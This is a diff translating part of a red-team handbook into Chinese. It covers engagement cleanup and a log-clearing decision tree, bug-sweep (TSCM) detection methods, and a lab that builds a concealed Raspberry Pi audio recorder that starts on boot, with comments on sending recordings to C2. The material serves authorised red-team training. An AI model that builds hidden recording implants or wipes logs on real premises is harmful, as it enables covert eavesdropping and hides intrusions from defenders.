-    [ ] Collect work order printouts
-    [ ] Dispose of any props (clipboards, vendor vests) appropriately
-    [ ] Delete pretext email accounts
-    [ ] Deactivate pretext LinkedIn profiles
+  托词材料：
+    [ ] 收回发给目标的名片：记录有多少无法追回
+    [ ] 收回工单打印件
+    [ ] 妥善处置任何道具（写字板、厂商背心）
+    [ ] 删除托词邮箱账户
+    [ ] 注销托词 LinkedIn 资料
 
-  Documentation of physical artifacts:
-    [ ] Photograph each implant location before retrieval
-        (evidence of placement for the report)
-    [ ] Photograph each implant location after retrieval
-        (evidence of clean removal for the cleanup log)
-    [ ] Note the time of each retrieval for the timeline
+  物理痕迹的记录：
+    [ ] 取回前拍摄每个植入点
+        （作为报告中布点的证据）
+    [ ] 取回后拍摄每个植入点
+        （作为清理日志中干净移除的证据）
+    [ ] 记录每次取回的时间，用于时间线
 ```
 
 ---
 
-### 5.4 LOG CLEARING DECISION TREE
+### 5.4 日志清除决策树
 
 ```
-This is the most commonly mishandled step in engagement cleanup.
-The answer depends on what type of engagement you ran.
+这是行动清理中最常被处理错的一步。
+答案取决于你执行的是哪种行动。
 
-Decision tree:
+决策树：
 
-  Is the engagement BLIND (blue team is NOT aware)?
-    YES:
-      Clear logs. The engagement value includes testing whether the blue team
-      detects the intrusion AND the cleanup. A full clean exit = a harder lesson
-      for the blue team. This is the expected behavior for a blind red team.
-      --> Proceed with all log clearing steps above.
+  行动是否为盲测（蓝队不知情）？
+    是：
+      清日志。行动价值包括检验蓝队能否检测到入侵
+      以及清理动作。完全干净退出 = 给蓝队更难的一课。
+      这是盲测红队的预期行为。
+      --> 执行上面所有日志清除步骤。
     
-    NO (blue team IS aware = "assumed breach" or "purple team" format):
-      Do you need the logs for the debrief / purple team session?
-        YES:
-          DO NOT clear logs. Export them first.
-          The logs are evidence of what happened: they teach the blue team.
-          After the debrief and any log analysis is complete:
-          client security team handles their own log retention per their policy.
-          --> Skip log clearing. Export relevant logs in JSON/CSV for the report.
+    否（蓝队知情 = “假定已被攻陷”或“紫队”形式）：
+      复盘 / 紫队演练是否需要日志？
+        是：
+          不要清日志。先把它们导出。
+          日志是发生了什么的证据：它们能教会蓝队。
+          复盘和任何日志分析完成之后：
+          客户安全团队按其政策自行处理日志留存。
+          --> 跳过日志清除。把相关日志导出为 JSON/CSV 供报告使用。
         
-        NO (logs not needed for debrief):
-          Client preference decides.
-          Ask during the pre-engagement scoping questionnaire (Section 4.1):
-          "Do you want logs cleared at the end of the engagement?"
-          Follow the written answer from the signed scope document.
-          --> Follow client instruction.
+        否（复盘不需要日志）：
+          由客户偏好决定。
+          在行动前范围界定问卷（4.1 节）中询问：
+          “行动结束时是否需要清除日志？”
+          按已签署范围文件中的书面答复执行。
+          --> 遵从客户指示。
 
-  Is this a TIBER-EU or CBEST engagement?
-    YES:
-      DO NOT clear logs. The regulator requires evidence of the attack timeline.
-      All logs are evidence and must be preserved for the regulatory submission.
-      --> DO NOT clear anything.
+  这是 TIBER-EU 或 CBEST 行动吗？
+    是：
+      不要清日志。监管机构要求提供攻击时间线的证据。
+      所有日志都是证据，必须为监管报送保留。
+      --> 什么都不要清。
 
-  Rule of thumb for every case:
-    If unsure: export first, then clear.
-    A log you export and then delete is better than a log you cannot recreate.
-    The export goes to your encrypted operator storage, is shared with the client
-    during the debrief, and is destroyed per your data handling agreement.
+  任何情况下的经验法则：
+    不确定时：先导出，再清除。
+    导出后再删除的日志，好过无法重现的日志。
+    导出件存入你加密的操作员存储，在复盘时
+    与客户共享，并按你的数据处理协议销毁。
 
-WHAT TO EXPORT BEFORE CLEARING:
-  Windows Security log: relevant Event IDs for your attack chain
-    4624/4625: logon success/failure
-    4648:      explicit credential logon (pass-the-hash visible here)
-    4698/4702: scheduled task created/modified
-    4728/4756: member added to security-enabled group
-    7045:      new service installed
+清除前要导出的内容：
+  Windows Security 日志：与你的攻击链相关的 Event ID
+    4624/4625：登录成功/失败
+    4648：      显式凭证登录（可在此看到哈希传递）
+    4698/4702：计划任务创建/修改
+    4728/4756：成员被加入安全启用组
+    7045：      新服务安装
   
-  Sysmon log: filter to your activity timeframe
-    Event ID 1:  process creation (your tool executions)
-    Event ID 3:  network connection (your C2 callbacks)
-    Event ID 11: file creation (your dropped files)
+  Sysmon 日志：过滤到你的活动时间窗
+    Event ID 1： 进程创建（你的工具执行）
+    Event ID 3： 网络连接（你的 C2 回连）
+    Event ID 11：文件创建（你投放的文件）
   
-  Export command:
+  导出命令：
     wevtutil qe Security /q:"*[System[TimeCreated[@SystemTime>='2027-01-01T09:00:00.000Z']]]" \
               /rd:true /f:xml > C:\Temp\security_export.xml
 ```
 
 ---
 
-## SECTION 6: TSCM: FINDING BUGS TO PLANT THEM
+## 第 6 部分：TSCM：发现窃听器以植入窃听器
 
-> TSCM (Technical Surveillance Countermeasures) is the practice of detecting surveillance devices. The offensive application is the inverse: understanding detection methods well enough to place devices that evade them. You cannot plant a good bug until you understand how it gets found.
-
----
-
-### 6.1 SURVEILLANCE DEVICE TYPES AND SIGNATURES
-
-```
-CATEGORY 1: RF (Radio Frequency) TRANSMITTERS
-  How they work: transmit audio/video over radio frequency
-  Detection: RF spectrum analyzer (sees the transmission)
-  Common frequencies:
-    GSM bugs:     890-960 MHz (900MHz band), 1710-1880 MHz (1800MHz band)
-    UMTS/3G bugs: 1900-2200 MHz
-    WiFi bugs:    2.4 GHz (2400-2483 MHz), 5 GHz (5150-5850 MHz)
-    Analog video: 900 MHz, 1200 MHz, 2400 MHz bands
-    Bluetooth:    2.402-2.480 GHz (frequency-hopping: harder to catch)
-    Sub-GHz:      315 MHz, 433 MHz, 868 MHz (common for simple audio transmitters)
-
-  GSM bugs: most common professional-grade device in 2027
-  Behavior: GSM chip registers on the cellular network and calls a number
-  or sends audio over SMS/data when triggered.
-  Detection signature: distinct GSM duty cycle burst: 4.6ms active every 577ms.
-  The burst is visible as a repeating spike on a spectrum analyzer.
-
-CATEGORY 2: PASSIVE DEVICES (no RF during standby)
-  How they work: store recordings locally; retrieved physically or via short-range RF
-  Detection: NLJD (Non-Linear Junction Detector)
-  Examples: voice-activated recorders (Sony ICD-PX470, ~$50), camera modules,
-            SIM card loggers disguised as everyday objects
-
-CATEGORY 3: OPTICAL DEVICES (cameras)
-  How they work: camera module hidden in an object; may or may not transmit
-  Detection: lens detection devices (optical or laser-based)
-  Common disguises: smoke detectors, clocks, chargers, USB adapters, picture frames,
-                    pens, tie clips, glasses
-  Lens detection: laser-based detectors (KJB Security DD1206P) illuminate the room;
-  camera lenses retroreflect the laser as a bright glint visible through the viewer.
-
-CATEGORY 4: NETWORK DEVICES (implants on the LAN)
-  How they work: hardware implant on the network: LAN Turtle, Packet Squirrel, Pi Zero W
-  Detection: network scan, unauthorized device enumeration, ARP monitoring
-  Examples: LAN Turtle, Hak5 Shark Jack, custom Pi Zero with 4G dongle
-
-CATEGORY 5: DISGUISED DEVICES (purpose-built covert hardware)
-  How they work: functional everyday object containing surveillance hardware
-  Examples: wall charger with GSM bug (common, $30-80 from AliExpress),
-            USB charging cable with keylogger, power strip with WiFi spy camera,
-            smoke detector with camera + WiFi, motion detector with GSM audio bug
-  Detection: requires combination of all four methods above
-```
+> TSCM（技术监控反制）是检测监控设备的实践。攻击性应用是它的反面：把检测方法理解到足以放置能躲过它们的设备。在你理解窃听器如何被发现之前，你无法植入一个好的窃听器。
 
 ---
 
-### 6.2 DETECTION METHODOLOGY: STEP BY STEP
+### 6.1 监控设备类型与特征
+
+```
+类别 1：射频（RF）发射器
+  工作原理：通过射频传输音频/视频
+  检测：射频频谱分析仪（能看到发射）
+  常见频段：
+    GSM 窃听器：    890-960 MHz（900MHz 频段）、1710-1880 MHz（1800MHz 频段）
+    UMTS/3G 窃听器：1900-2200 MHz
+    WiFi 窃听器：   2.4 GHz（2400-2483 MHz）、5 GHz（5150-5850 MHz）
+    模拟视频：      900 MHz、1200 MHz、2400 MHz 频段
+    蓝牙：          2.402-2.480 GHz（跳频：更难抓到）
+    Sub-GHz：       315 MHz、433 MHz、868 MHz（简易音频发射器常用）
+
+  GSM 窃听器：2027 年最常见的专业级设备
+  行为：GSM 芯片在蜂窝网络上注册，被触发时拨号
+  或通过短信/数据发送音频。
+  检测特征：明显的 GSM 占空比脉冲：每 577ms 中有 4.6ms 活跃。
+  该脉冲在频谱分析仪上表现为重复出现的尖峰。
+
+类别 2：被动设备（待机时无射频）
+  工作原理：本地存储录音；靠物理取回或短距射频取回
+  检测：NLJD（非线性结探测器）
+  例子：声控录音笔（Sony ICD-PX470，约 50 美元）、摄像模块、
+        伪装成日常物品的 SIM 卡记录器
+
+类别 3：光学设备（摄像头）
+  工作原理：摄像模块藏在物品中；可能发射也可能不发射
+  检测：镜头探测设备（光学或激光方式）
+  常见伪装：烟雾探测器、时钟、充电器、USB 适配器、相框、
+              笔、领带夹、眼镜
+  镜头探测：激光式探测器（KJB Security DD1206P）照射房间；
+  摄像头镜头会把激光回反射成透过观察窗可见的明亮闪光。
+
+类别 4：网络设备（局域网上的植入体）
+  工作原理：网络上的硬件植入体：LAN Turtle、Packet Squirrel、Pi Zero W
+  检测：网络扫描、未授权设备枚举、ARP 监控
+  例子：LAN Turtle、Hak5 Shark Jack、带 4G 网卡的定制 Pi Zero
+
+类别 5：伪装设备（专门制造的隐蔽硬件）
+  工作原理：外观可用的日常物品内含监控硬件
+  例子：带 GSM 窃听器的墙插充电器（常见，速卖通 30-80 美元）、
+        带键盘记录器的 USB 充电线、带 WiFi 针孔摄像头的插线板、
+        带摄像头 + WiFi 的烟雾探测器、带 GSM 音频窃听器的移动探测器
+  检测：需要综合运用上述四种方法
+```
+
+---
+
+### 6.2 检测方法论：分步指南
 
 <div align="center">
 <table><tr><td>
@@ -3533,434 +3533,434 @@ CATEGORY 5: DISGUISED DEVICES (purpose-built covert hardware)
 </div>
 
 ```
-STEP 1: PHYSICAL VISUAL INSPECTION
-  Before electronics: use your eyes. Most bugs are in objects.
-  What to inspect:
-    All power outlets and socket face plates (common place to hide a bug)
-    All smoke detectors and CO detectors (height gives them coverage of the room)
-    All clocks, picture frames, and decorative items on walls or desks
-    All items that seem out of place or have been recently moved
-    (look for dust outlines, disturbed surfaces, fresh marks on walls)
-    All USB chargers and power strips
-    All conference phones and desk phones
-    Under tables and desks (magnetic-mount devices attach to the underside)
-    Inside air vents within arm's reach
-    Behind mirrors (two-way mirror test: place your fingernail on the mirror surface.
-    If there is a gap between your nail and its reflection: standard mirror.
-    If there is no gap: two-way mirror. Tap: hollow sound = suspect.)
+第 1 步：物理目视检查
+  在动用电子设备之前：先用眼睛。多数窃听器藏在物品里。
+  要检查什么：
+    所有电源插座和插座面板（藏窃听器的常见位置）
+    所有烟雾探测器和一氧化碳探测器（高度让它们能覆盖房间）
+    墙上或桌上所有时钟、相框和装饰物
+    所有显得格格不入或最近被动过的物品
+    （寻找灰尘轮廓、被扰动的表面、墙上的新痕迹）
+    所有 USB 充电器和插线板
+    所有会议电话和桌面电话
+    桌子下方（磁吸式设备会吸附在底面）
+    手臂可及范围内的通风口内部
+    镜子背后（双向镜测试：把指甲贴在镜面上。
+    如果指甲与倒影之间有缝隙：普通镜子。
+    如果没有缝隙：双向镜。敲一下：声音发空 = 可疑。）
 
-STEP 2: RF SPECTRUM SWEEP
-  Tool: RF Explorer (Section 6.3 has the full walkthrough)
-  Time required: 15-20 minutes for a standard conference room
-  What to look for: unexpected transmissions in bug frequency ranges
+第 2 步：射频频谱扫描
+  工具：RF Explorer（6.3 节有完整演练）
+  所需时间：标准会议室 15-20 分钟
+  要找什么：窃听器频段内的异常发射
   
-  Critical behavior to check for: GSM duty cycle
-    GSM bugs are often set to transmit only when triggered (sound-activated or called).
-    During a sweep if the room is quiet: the bug may not be transmitting.
-    Introduce noise: speak aloud, play a sound, clap: trigger the VOX (voice-activated) bug.
-    Then sweep again. The GSM burst will appear if a VOX bug is present.
+  必须检查的关键行为：GSM 占空比
+    GSM 窃听器常被设为仅在触发时发射（声控或被呼叫）。
+    扫描时如果房间安静：窃听器可能并未发射。
+    制造噪音：说话、放一段声音、拍手：触发 VOX（声控）窃听器。
+    然后再次扫描。若存在 VOX 窃听器，GSM 脉冲就会显现。
 
-STEP 3: NLJD (Non-Linear Junction Detector) SWEEP
-  Tool: REI ORION 2.4 HX ($3,800+) or less expensive CCM-100 (~$800)
-  What it detects: semiconductor junctions (transistors, diodes, chips)
-  How: transmits a signal; semiconductors return a harmonic (2nd or 3rd order)
-  Result: the NLJD finds electronics even when they are powered off, passive,
-  or shielded against RF emission.
+第 3 步：NLJD（非线性结探测器）扫描
+  工具：REI ORION 2.4 HX（3800 美元以上）或更便宜的 CCM-100（约 800 美元）
+  检测什么：半导体结（晶体管、二极管、芯片）
+  原理：发射一个信号；半导体返回谐波（2 次或 3 次）
+  结果：即使设备已断电、是被动式，或对射频发射做了屏蔽，
+  NLJD 也能发现电子器件。
   
-  FALSE POSITIVE MANAGEMENT (the step most tutorials skip):
-    In an electronics-dense office: the NLJD will detect everything.
-    Every electrical outlet, laptop, phone charger, desk lamp will respond.
+  误报管理（多数教程跳过的一步）：
+    在电子设备密集的办公室：NLJD 会对一切报警。
+    每个电源插座、笔记本、手机充电器、台灯都会有反应。
     
-    Triage protocol for false positives:
-    Step A: When the NLJD signals, mark the location with painter's tape.
-    Step B: Identify the obvious electronics at that location.
-    Step C: Move the electronics: re-sweep at that exact location.
-            If signal disappears: it was the known device. Clear.
-            If signal remains: there is a device that is NOT accounted for. Investigate.
-    Step D: Inspect concealed areas: inside walls, under baseboards, inside furniture.
+    误报的甄别流程：
+    步骤 A：NLJD 报警时，用美纹纸标记该位置。
+    步骤 B：辨明该位置的显性电子设备。
+    步骤 C：移走这些电子设备：在同一位置重新扫描。
+            若信号消失：是已知设备。排除。
+            若信号仍在：存在一个未被解释的设备。深入检查。
+    步骤 D：检查隐蔽区域：墙体内部、踢脚线下、家具内部。
     
-    NLJD response characteristics:
-      Real device: strong 2nd-harmonic response, directional (follows the antenna sweep)
-      False positive (foil, metal): strong response to both 2nd AND 3rd harmonic
-                                   proportionally: real semiconductors have a distinctive
-                                   2nd:3rd harmonic ratio vs. passive metal
+    NLJD 响应特征：
+      真实设备：强烈的 2 次谐波响应，有方向性（跟随天线扫动）
+      误报（锡箔、金属）：对 2 次和 3 次谐波都有成比例
+                                   的强响应：真实半导体的 2 次:3 次
+                                   谐波比值与被动金属明显不同
 
-STEP 4: OPTICAL LENS DETECTION
-  Tool: KJB Security DD1206P lens detector (~$30): simple but effective
-        JMDHKK Bug Detector (also useful for quick office sweeps, ~$40)
-  Method: turn off room lights. Shine the lens detector's infrared LEDs around the room
-          while looking through the detector's viewer (red filter on the eyepiece).
-          Camera lenses retroreflect the IR as a distinct glint: visible at distances
-          up to 6-8 meters depending on lens size.
-  Sweep: slowly scan the room in a grid pattern (not random).
-         Pay special attention to: smoke detectors, wall outlets, clocks, picture frames.
+第 4 步：光学镜头探测
+  工具：KJB Security DD1206P 镜头探测器（约 30 美元）：简单但有效
+        JMDHKK 探测器（用于快速办公室扫描也好用，约 40 美元）
+  方法：关掉房间灯光。让镜头探测器的红外 LED 扫过房间，
+          同时透过探测器的观察窗看（目镜上有红色滤光片）。
+          摄像头镜头会把红外回反射成明显的闪光：在 6-8 米内
+          可见，具体距离取决于镜头大小。
+  扫描：以网格方式缓慢扫过房间（不要乱扫）。
+         特别注意：烟雾探测器、墙插、时钟、相框。
   
-  Confirm a find: if you see a glint that does not correspond to a known reflective surface
-  (window, mirror, glass decor), investigate that location physically.
+  确认发现：如果你看到一处闪光，且它并不对应任何已知反光面
+  （窗户、镜子、玻璃装饰），就对那个位置做物理检查。
 
-STEP 5: NETWORK DEVICE SCAN
-  From a laptop connected to the target network:
+第 5 步：网络设备扫描
+  从接入目标网络的笔记本上：
 ```
 
 ```bash
-# Step 5a: Discover all devices on the local subnet
+# 步骤 5a：发现本地子网上的所有设备
 nmap -sn 192.168.1.0/24 -oG /tmp/hosts.txt
 
-# Step 5b: Identify unauthorized devices
-# Export a known-good device list from IT (or build one on a clean Monday morning).
-# Compare the current scan to the known-good list.
-# Any MAC address not in the known-good list is a candidate for investigation.
+# 步骤 5b：识别未授权设备
+# 从 IT 导出一份已知合法设备清单（或在干净的周一早晨自己建一份）。
+# 把当前扫描结果与已知合法清单对比。
+# 任何不在已知合法清单中的 MAC 地址都是待查对象。
 
-# Step 5c: Identify LAN Turtle / Pi Zero / Hak5 device signatures:
-# LAN Turtle Gen 3 MAC prefix: Motorola Solutions (70:3A:CB) or Hak5 (00:13:37)
-# Check OUI:
+# 步骤 5c：识别 LAN Turtle / Pi Zero / Hak5 设备特征：
+# LAN Turtle Gen 3 的 MAC 前缀：Motorola Solutions（70:3A:CB）或 Hak5（00:13:37）
+# 核查 OUI：
 grep "00:13:37\|70:3A:CB\|DC:A6:32\|B8:27:EB" /tmp/hosts.txt
-# DC:A6:32 and B8:27:EB = Raspberry Pi Foundation: investigate any Pi on the network
+# DC:A6:32 和 B8:27:EB = Raspberry Pi Foundation：网络上任何 Pi 都要查
 
-# Step 5d: ARP sweep (catches devices that do not respond to ICMP):
+# 步骤 5d：ARP 扫描（可抓到不响应 ICMP 的设备）：
 arp-scan --localnet 2>/dev/null | grep -iE "00:13:37|70:3A:CB|DC:A6:32|B8:27:EB"
 
-# Step 5e: Check for unusual network activity from unknown devices:
-# Install Wireshark or tcpdump and watch traffic for 5 minutes.
-# Signs of an implant: outbound SSH or HTTPS to unusual external IPs,
-# periodic keep-alive packets, DNS queries to dynamic DNS providers.
+# 步骤 5e：检查来自未知设备的异常网络活动：
+# 安装 Wireshark 或 tcpdump，观察流量 5 分钟。
+# 植入体的迹象：到异常外部 IP 的出站 SSH 或 HTTPS、
+# 周期性保活包、向动态 DNS 服务商发起的 DNS 查询。
 tcpdump -i eth0 -n 'not (src host 192.168.1.1 or dst host 192.168.1.1)' \
         -w /tmp/network_sweep.pcap &
-sleep 300 && kill %1  # Capture for 5 minutes
+sleep 300 && kill %1  # 采集 5 分钟
 ```
 
 ```
-STEP 6: AUDIO ANOMALY AND POWER LINE CHECK
-  Audio anomaly check:
-    Use a smartphone app (Spectrum Analyzer Pro, Audio Spectrum Analyzer)
-    in a quiet room to look for anomalous sounds in the ultrasonic range.
-    Some older analog transmitters produce a carrier tone that bleeds into
-    the audible or near-audible range.
+第 6 步：音频异常与电力线检查
+  音频异常检查：
+    在安静的房间里用手机应用（Spectrum Analyzer Pro、Audio Spectrum Analyzer）
+    寻找超声波范围内的异常声音。
+    一些较老的模拟发射器会产生载波音，泄漏到
+    可听或近可听范围内。
   
-  Power line analysis:
-    Some devices transmit data over power lines (Power Line Carrier communication).
-    Tool: REI CPM-700 or a power line spectrum analyzer.
-    Connect to the power circuit and sweep 5-500 kHz.
-    Legitimate power line noise: harmonics of 60 Hz (US) or 50 Hz (EU).
-    Unexpected narrowband signals in the 100-300 kHz range: investigate.
+  电力线分析：
+    有些设备通过电力线传输数据（电力线载波通信）。
+    工具：REI CPM-700 或电力线频谱分析仪。
+    接到电源回路上，扫描 5-500 kHz。
+    合法电力线噪声：60 Hz（美国）或 50 Hz（欧盟）的谐波。
+    100-300 kHz 范围内的异常窄带信号：需要排查。
 ```
 
 ---
 
-### 6.3 RF EXPLORER PRACTICAL WALKTHROUGH
+### 6.3 RF Explorer 实操演练
 
 ```
-EQUIPMENT:
-  RF Explorer 3G+ (recommended: covers 15 MHz - 2.7 GHz): ~$130
-  RF Explorer 6G (covers up to 6.1 GHz, includes 5 GHz WiFi band): ~$220
-  SMA antenna: the stock dipole antenna works for initial sweeps
+设备：
+  RF Explorer 3G+（推荐：覆盖 15 MHz - 2.7 GHz）：约 130 美元
+  RF Explorer 6G（最高覆盖 6.1 GHz，含 5 GHz WiFi 频段）：约 220 美元
+  SMA 天线：随附的偶极天线足以做初步扫描
 
-SETUP:
-  Connect RF Explorer to laptop via USB.
-  Install RF Explorer for Windows or rfexplorer (Python, cross-platform).
-  Launch the software: the live spectrum view opens immediately.
+准备：
+  用 USB 把 RF Explorer 接到笔记本。
+  安装 RF Explorer for Windows 或 rfexplorer（Python，跨平台）。
+  启动软件：实时频谱视图会立即打开。
 
-REFERENCE BASELINE (do this FIRST):
-  Before you enter the target space: take a reference capture OUTSIDE the room
-  with no one inside. This gives you the ambient RF environment of the building.
-  Save it. Compare all subsequent sweeps against this baseline.
-  Anything that appears ONLY after you enter the room is a candidate.
+参考基线（先做这一步）：
+  在进入目标空间之前：在房间外、无人在内的情况下做一次参考采集。
+  这给你该建筑的射频环境本底。
+  保存它。把之后每次扫描都与这个基线对比。
+  只有在进入房间后才出现的信号，才是候选目标。
 
-BAND-BY-BAND SWEEP:
+逐频段扫描：
 
-  Band 1: Sub-GHz (15 MHz - 960 MHz)
-    Set RF Explorer: Start 15 MHz, Stop 960 MHz
-    Sweep time: 3-5 minutes, slow manual sweep
-    What you see: FM radio (88-108 MHz), cell towers (700-960 MHz),
-    ISM devices (315, 433, 868 MHz), GSM downlink (869-960 MHz)
+  频段 1：Sub-GHz（15 MHz - 960 MHz）
+    设置 RF Explorer：起始 15 MHz，终止 960 MHz
+    扫描时间：3-5 分钟，缓慢手动扫描
+    你会看到：FM 广播（88-108 MHz）、基站（700-960 MHz）、
+    ISM 设备（315、433、868 MHz）、GSM 下行（869-960 MHz）
     
-    WHAT TO FLAG: Any unexplained persistent signal above noise floor by > 15 dBm
-    GSM bug signature: look at 890-960 MHz range.
-    A GSM bug shows as a narrow burst (4.6 ms wide) repeating every ~577 ms.
-    It looks like a regular spike in the GSM band. Compare against the baseline.
-    If the spike is present inside the room but not in your baseline: investigate.
+    要标记什么：任何高出底噪 15 dBm 以上、且无法解释的持续信号
+    GSM 窃听器特征：看 890-960 MHz 范围。
+    GSM 窃听器表现为约每 577 ms 重复一次的窄脉冲（宽 4.6 ms）。
+    它看起来像 GSM 频段内规律的尖峰。与基线对比。
+    若该尖峰在房间内存在而基线中没有：深入排查。
 
-  Band 2: 2.4 GHz (WiFi + Bluetooth + analog cameras)
-    Set: Start 2400 MHz, Stop 2485 MHz
-    What you see: your own WiFi, neighboring WiFi (continuous with SSID beacons),
-    Bluetooth devices (frequency-hopping, appears as a wide low-level spread)
+  频段 2：2.4 GHz（WiFi + 蓝牙 + 模拟摄像头）
+    设置：起始 2400 MHz，终止 2485 MHz
+    你会看到：你自己的 WiFi、邻居的 WiFi（带 SSID 信标的连续信号）、
+    蓝牙设备（跳频，表现为宽而低电平的散布）
     
-    Analog camera signature: if a 2.4 GHz wireless camera is present, you will see
-    a very wide (20-50 MHz) continuous signal at a fixed frequency in the 2.4 GHz band.
-    It looks distinctly different from WiFi (which hops and has specific channel patterns).
+    模拟摄像头特征：若存在 2.4 GHz 无线摄像头，你会看到
+    2.4 GHz 频段内某固定频率上一个非常宽（20-50 MHz）的连续信号。
+    它与 WiFi 明显不同（WiFi 会跳频并有特定的信道模式）。
     
-    Modern IP camera (WiFi-connected): appears as a normal WiFi device.
-    Catch it in Step 5 (network scan) rather than RF sweep.
+    现代 IP 摄像头（WiFi 连接）：表现为普通 WiFi 设备。
+    在第 5 步（网络扫描）中抓它，而不是靠射频扫描。
 
-  Band 3: 5 GHz (modern WiFi cameras)
-    Set: Start 5150 MHz, Stop 5850 MHz (requires 6G model)
-    Most covert cameras that use 5 GHz look like a standard WiFi AP.
-    Catch these in the network scan: they appear as unknown WiFi clients.
+  频段 3：5 GHz（现代 WiFi 摄像头）
+    设置：起始 5150 MHz，终止 5850 MHz（需要 6G 型号）
+    多数使用 5 GHz 的隐蔽摄像头看起来就像普通 WiFi AP。
+    在网络扫描中抓它们：它们表现为未知 WiFi 客户端。
 
-  Band 4: GSM 1800/UMTS/4G (more sophisticated bugs)
-    Set: Start 1700 MHz, Stop 2200 MHz
-    4G LTE bugs: more bandwidth, more sophisticated, harder to detect by signal alone.
-    Detection: 4G devices have distinctive LTE frame structure.
-    Look for: wide-band (5-20 MHz) signals in the 1700-2100 MHz range that were
-    not present in your baseline scan.
+  频段 4：GSM 1800/UMTS/4G（更复杂的窃听器）
+    设置：起始 1700 MHz，终止 2200 MHz
+    4G LTE 窃听器：带宽更大、更复杂，仅凭信号更难检测。
+    检测：4G 设备有独特的 LTE 帧结构。
+    寻找：1700-2100 MHz 范围内宽度大（5-20 MHz）的信号，
+    且在你的基线扫描中并不存在。
 
-DWELL TIME AND TRIGGER:
-  Spend at least 3 minutes on each band without moving.
-  Then trigger: make noise (clap, speak, bang on the table).
-  VOX (voice-activated) bugs activate on sound.
-  Watch the RF Explorer for new signals that appear AFTER you introduce noise.
-  If a signal appears at 890-960 MHz within 5-10 seconds of a loud noise:
-  you have found a VOX-triggered GSM bug. Note the exact frequency.
+驻留时间与触发：
+  每个频段至少驻留 3 分钟，不要移动。
+  然后触发：制造噪音（拍手、说话、敲桌子）。
+  VOX（声控）窃听器会被声音激活。
+  盯着 RF Explorer，看在你制造噪音之后 出现的新信号。
+  若在一声巨响后 5-10 秒内 890-960 MHz 出现信号：
+  你就找到了一个 VOX 触发的 GSM 窃听器。记下确切的频率。
 
-SIGNAL INTERPRETATION TABLE:
-  Signal type                              | Expected behavior
+信号判读表：
+  信号类型                                 | 预期表现
   -----------------------------------------|--------------------------------------------
-  FM Radio (88-108 MHz)                    | Continuous, multiple carriers: normal
-  ISM 433 MHz (remote controls, sensors)   | Intermittent pulses: check baseline
-  GSM 900 (legitimate cell coverage)       | Regular traffic from towers, external only
-  GSM 900 bug                              | NEW burst inside room not in baseline
-  2.4 GHz WiFi (known AP)                  | Continuous beacons at fixed channel: normal
-  2.4 GHz analog camera                    | Continuous wide signal at fixed frequency: SUSPECT
-  Bluetooth (headsets, keyboards)          | Frequency-hopping spread: identify source
-  Unknown narrowband signal > 15 dB floor  | INVESTIGATE: note freq, bandwidth, behavior
+  FM 广播（88-108 MHz）                    | 连续、多载波：正常
+  ISM 433 MHz（遥控器、传感器）            | 间歇脉冲：对照基线
+  GSM 900（合法蜂窝覆盖）                  | 来自基站的规律流量，仅见于外部
+  GSM 900 窃听器                           | 房间内出现基线中没有的新脉冲
+  2.4 GHz WiFi（已知 AP）                  | 固定信道上的连续信标：正常
+  2.4 GHz 模拟摄像头                       | 固定频率上的连续宽带信号：可疑
+  蓝牙（耳机、键盘）                       | 跳频扩频：确认来源
+  未知窄带信号，高出底噪 15 dB             | 深入排查：记录频率、带宽、行为
 ```
 
 ---
 
-### 6.4 LAB EXERCISE: BUILD AND DETECT
+### 6.4 实验练习：搭建与检测
 
 ```
-PURPOSE:
-  You cannot understand detection until you have done placement.
-  This lab teaches both skills simultaneously.
+目的：
+  在做完布点之前，你无法真正理解检测。
+  本实验同时训练这两项技能。
 
-MATERIALS:
-  Raspberry Pi Zero 2 W ($15)
-  USB audio dongle (SABRENT USB sound adapter, $8)
-  USB OTG adapter ($3)
-  MicroSD card 16GB ($5)
-  USB-C power bank (or USB power adapter)
-  RF Explorer or cheap spectrum analyzer (WiPry app on iOS works for basic detection)
-  Small box or household object to conceal the Pi
+材料：
+  Raspberry Pi Zero 2 W（15 美元）
+  USB 音频转接头（SABRENT USB 声卡，8 美元）
+  USB OTG 转接头（3 美元）
+  MicroSD 卡 16GB（5 美元）
+  USB-C 移动电源（或 USB 电源适配器）
+  RF Explorer 或廉价频谱分析仪（iOS 上的 WiPry 应用可做基础检测）
+  用于藏匿 Pi 的小盒或家用物品
 
-STEP 1: SET UP THE PI ZERO AS AN AUDIO IMPLANT
+第 1 步：把 PI ZERO 搭成音频植入体
 ```
 
 ```bash
-# Flash Raspberry Pi OS Lite to MicroSD (use Raspberry Pi Imager)
-# Boot and SSH in: ssh pi@raspberrypi.local
+# 把 Raspberry Pi OS Lite 刷到 MicroSD（用 Raspberry Pi Imager）
+# 启动并 SSH 登录：ssh pi@raspberrypi.local
 
-# Install recording software:
+# 安装录音软件：
 sudo apt-get update && sudo apt-get install -y sox arecord alsa-utils wireless-tools
 
-# Identify your USB audio device:
+# 识别你的 USB 音频设备：
 arecord -l
-# Should show: USB PnP Sound Device
+# 应显示：USB PnP Sound Device
 
-# Test recording:
+# 测试录音：
 arecord -D plughw:1,0 -f cd -t wav test.wav
-# Speak for 5 seconds, Ctrl+C
+# 说 5 秒钟，Ctrl+C
 
-# Set up continuous recording (writes 10-minute chunks):
+# 设置连续录音（每 10 分钟切一个文件）：
 cat > /home/pi/record.sh << 'EOF'
 #!/bin/bash
 while true; do
     FILENAME="/tmp/rec_$(date +%Y%m%d_%H%M%S).wav"
     arecord -D plughw:1,0 -f cd -t wav -d 600 "$FILENAME"
-    # Optional: compress and exfil via WiFi
+    # 可选：压缩并通过 WiFi 传出
 done
 EOF
 chmod +x /home/pi/record.sh
 
-# Auto-start on boot (cron):
+# 开机自启（cron）：
 echo "@reboot sleep 10 && /home/pi/record.sh &" | crontab -
 
-# If using WiFi to exfil: configure wpa_supplicant with target WiFi credentials
-# Pi Zero W will auto-connect and files can be retrieved via scp or uploaded to C2
+# 若用 WiFi 传出：把目标 WiFi 凭证配置进 wpa_supplicant
+# Pi Zero W 会自动连接，文件可通过 scp 取回或上传到 C2
 ```
 
 ```
-STEP 2: CONCEAL THE DEVICE
-  Place the Pi Zero + audio dongle inside a household object:
-  phone charger box, alarm clock housing, book, small decorative item.
+第 2 步：藏匿设备
+  把 Pi Zero + 音频转接头放进一件家用物品：
+  手机充电器包装盒、闹钟外壳、书、小装饰品。
   
-  Challenge: can a colleague find it with only their eyes and no equipment?
+  挑战：同事仅凭眼睛、不借助任何设备，能找到它吗？
 
-STEP 3: ATTEMPT DETECTION (using skills from Section 6.2)
-  Now try to find it:
+第 3 步：尝试检测（运用 6.2 节的技能）
+  现在试着找到它：
   
